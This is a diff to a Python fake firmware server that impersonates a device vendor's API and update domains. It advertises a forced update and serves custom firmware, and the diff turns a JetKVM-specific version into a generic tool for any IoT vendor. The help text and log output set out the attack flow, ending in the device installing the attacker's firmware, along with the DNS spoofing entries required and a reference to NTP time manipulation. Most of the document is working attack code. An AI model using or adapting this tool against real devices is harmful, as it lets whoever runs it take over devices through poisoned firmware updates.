@@ -1,15 +1,15 @@
 #!/usr/bin/env python3
 """
-Fake Firmware Server for JetKVM
-Impersonates update.jetkvm.com to serve custom firmware files.
+Fake Firmware Server for IoT Devices
+Impersonates a vendor's update server to serve custom firmware files.
 
-The device checks api.jetkvm.com for updates (allowed to reach real server),
-then downloads firmware from update.jetkvm.com (spoofed to this server).
+The device checks an API server for updates (allowed to reach real server),
+then downloads firmware from an update server (spoofed to this server).
 
 Usage:
     sudo python3 fake-firmware-server.py --cert server.crt --key server.key --firmware-dir ./firmware
 
-Requires DNS spoofing to redirect update.jetkvm.com to this server.
+Requires DNS spoofing to redirect the vendor's update domain to this server.
 """
 
 import argparse
@@ -43,9 +43,11 @@ class FirmwareConfig:
         self.cert_file = None
         self.key_file = None
         # API spoofing settings
-        self.spoof_api = False     # Enable api.jetkvm.com spoofing
+        self.spoof_api = False     # Enable API endpoint spoofing
         self.firmware_version = "99.0.0"  # Version to advertise (high = force update)
-        self.update_host = "update.jetkvm.com"  # Host for download URLs
+        self.update_host = "update.example.com"  # Host for download URLs
+        self.app_filename = "firmware_app"  # Application firmware filename
+        self.allowed_files = []    # Populated from --firmware-files
 
 config = FirmwareConfig()
 
@@ -104,8 +106,7 @@ class FirmwareRequestHandler(BaseHTTPRequestHandler):
     def handle_firmware_download(self, filename):
         """Handle firmware file downloads."""
         # Security: only allow specific filenames
-        allowed_files = ['jetkvm_app', 'system.tar']
-        if filename not in allowed_files:
+        if filename not in config.allowed_files:
             logger.warning("Attempted to download disallowed file: %s", filename)
             self.send_error(403, "Forbidden")
             return
@@ -124,18 +125,18 @@ class FirmwareRequestHandler(BaseHTTPRequestHandler):
         self.send_file_response(filepath, content_type)
 
     def handle_releases_api(self, query_params):
-        """Handle /releases API endpoint (spoofs api.jetkvm.com)."""
+        """Handle /releases API endpoint (spoofs vendor API)."""
         device_id = query_params.get('deviceId', ['unknown'])[0]
         prerelease = query_params.get('prerelease', ['false'])[0]
 
-        logger.info("=== API REQUEST (api.jetkvm.com spoof) ===")
+        logger.info("=== API REQUEST (vendor API spoof) ===")
         logger.info("Device ID: %s", device_id)
         logger.info("Prerelease: %s", prerelease)
         logger.info("Client: %s", self.address_string())
 
-        # Build firmware URLs pointing to update.jetkvm.com (also spoofed to us)
+        # Build firmware URLs pointing to update host (also spoofed to us)
         version = config.firmware_version
-        app_url = f"https://{config.update_host}/app/{version}/jetkvm_app"
+        app_url = f"https://{config.update_host}/app/{version}/{config.app_filename}"
         system_url = f"https://{config.update_host}/system/{version}/system.tar"
 
         response = {
@@ -161,23 +162,23 @@ class FirmwareRequestHandler(BaseHTTPRequestHandler):
 
         # Route requests
         if path == '/releases':
-            # Handle api.jetkvm.com /releases endpoint
+            # Handle /releases endpoint
             self.handle_releases_api(query_params)
-        elif path.startswith('/app/') and path.endswith('/jetkvm_app'):
-            # Handle /app/{version}/jetkvm_app - serves firmware/jetkvm_app
-            self.handle_firmware_download('jetkvm_app')
+        elif path.startswith('/app/') and path.endswith(f'/{config.app_filename}'):
+            # Handle /app/{version}/<app_filename> - serves firmware app
+            self.handle_firmware_download(config.app_filename)
         elif path.startswith('/system/') and path.endswith('/system.tar'):
             # Handle /system/{version}/system.tar - serves firmware/system.tar
             self.handle_firmware_download('system.tar')
         elif path == '/':
             # Root path - return basic info
             self.send_json_response({
-                "service": "JetKVM Firmware Server (spoofs api.jetkvm.com + update.jetkvm.com)",
+                "service": "Fake Firmware Server",
                 "note": "Serves fake API responses and custom firmware",
                 "endpoints": [
-                    "/releases?deviceId=XXX (api.jetkvm.com)",
-                    "/app/<version>/jetkvm_app (update.jetkvm.com)",
-                    "/system/<version>/system.tar (update.jetkvm.com)"
+                    "/releases?deviceId=XXX",
+                    f"/app/<version>/{config.app_filename}",
+                    "/system/<version>/system.tar"
                 ]
             })
         else:
@@ -285,28 +286,29 @@ def run_server(config):
     logger.info("Firmware version: %s", config.firmware_version)
     logger.info("")
     logger.info("Endpoints:")
-    logger.info("  GET /releases              -> fake api.jetkvm.com response")
-    logger.info("  GET /app/<ver>/jetkvm_app  -> serves firmware/jetkvm_app")
-    logger.info("  GET /system/<ver>/system.tar -> serves firmware/system.tar")
+    logger.info("  GET /releases                    -> fake vendor API response")
+    logger.info("  GET /app/<ver>/%s  -> serves firmware app", config.app_filename)
+    logger.info("  GET /system/<ver>/system.tar      -> serves firmware/system.tar")
     logger.info("")
     logger.info("Attack flow:")
-    logger.info("  1. Device queries api.jetkvm.com/releases (spoofed to us)")
-    logger.info("  2. We return firmware URLs pointing to update.jetkvm.com")
-    logger.info("  3. Device downloads from update.jetkvm.com (also spoofed to us)")
+    logger.info("  1. Device queries vendor API /releases (spoofed to us)")
+    logger.info("  2. We return firmware URLs pointing to update host")
+    logger.info("  3. Device downloads from update host (also spoofed to us)")
     logger.info("  4. Device installs YOUR firmware")
     logger.info("")
     logger.info("DNS spoofing required:")
-    logger.info("  address=/api.jetkvm.com/<this-server-ip>")
-    logger.info("  address=/update.jetkvm.com/<this-server-ip>")
+    logger.info("  address=/api.example.com/<this-server-ip>")
+    logger.info("  address=/update.example.com/<this-server-ip>")
+    logger.info("  (replace example.com with the actual vendor domains)")
     logger.info("=" * 60)
 
     # Check for firmware files
-    app_path = Path(config.firmware_dir) / "jetkvm_app"
+    app_path = Path(config.firmware_dir) / config.app_filename
     system_path = Path(config.firmware_dir) / "system.tar"
 
     if not app_path.exists() and not system_path.exists():
         logger.warning("WARNING: No firmware files found in %s", config.firmware_dir)
-        logger.warning("Place jetkvm_app and/or system.tar in the firmware directory")
+        logger.warning("Place firmware files in the firmware directory")
 
     # Run servers in threads
     def serve(server, name):
@@ -332,13 +334,13 @@ def run_server(config):
 
 def main():
     parser = argparse.ArgumentParser(
-        description='Fake firmware server for JetKVM devices (impersonates update.jetkvm.com)',
+        description='Fake firmware server for IoT devices (impersonates vendor update server)',
         formatter_class=argparse.RawDescriptionHelpFormatter,
         epilog="""
 How it works (full attack with NTP time manipulation):
-  1. Device queries api.jetkvm.com/releases (DNS spoofed to us)
-  2. We return firmware URLs pointing to update.jetkvm.com
-  3. Device downloads from update.jetkvm.com (also DNS spoofed to us)
+  1. Device queries vendor API /releases (DNS spoofed to us)
+  2. We return firmware URLs pointing to update host
+  3. Device downloads from update host (also DNS spoofed to us)
   4. Device installs YOUR firmware
 
 Examples:
@@ -354,9 +356,14 @@ Examples:
   # Custom firmware version (forces update)
   sudo python3 %(prog)s --cert server.crt --key server.key --firmware-version 99.0.0
 
+  # Custom update host and app filename
+  sudo python3 %(prog)s --cert server.crt --key server.key \\
+    --update-host update.vendor.com --app-filename device_app
+
 DNS spoofing required (both domains):
-  address=/api.jetkvm.com/192.168.200.1
-  address=/update.jetkvm.com/192.168.200.1
+  address=/api.example.com/192.168.200.1
+  address=/update.example.com/192.168.200.1
+  (replace example.com with the actual vendor domains)
         """
     )
 
@@ -374,6 +381,12 @@ DNS spoofing required (both domains):
                         help='Directory containing firmware files (default: ./firmware)')
     parser.add_argument('--firmware-version', default='99.0.0',
                         help='Firmware version to advertise in /releases API (default: 99.0.0)')
+    parser.add_argument('--update-host', default='update.example.com',
+                        help='Hostname for download URLs in API responses (default: update.example.com)')
+    parser.add_argument('--app-filename', default='firmware_app',
+                        help='Application firmware filename (default: firmware_app)')
+    parser.add_argument('--firmware-files', nargs='+', default=None,
+                        help='Allowed firmware filenames (default: <app-filename> system.tar)')
     parser.add_argument('--host', default='0.0.0.0',
                         help='Host to bind to (default: 0.0.0.0)')
 
@@ -405,9 +418,17 @@ DNS spoofing required (both domains):
     config.key_file = args.key
     config.firmware_dir = args.firmware_dir
     config.firmware_version = args.firmware_version
+    config.update_host = args.update_host
+    config.app_filename = args.app_filename
     config.server_host = args.host
     config.http_port = args.http_port if args.http else None
     config.https_port = args.https_port
+
+    # Set allowed firmware files
+    if args.firmware_files:
+        config.allowed_files = args.firmware_files
+    else:
+        config.allowed_files = [config.app_filename, 'system.tar']
 
     # Check if running as root (needed for privileged ports)
     needs_root = False
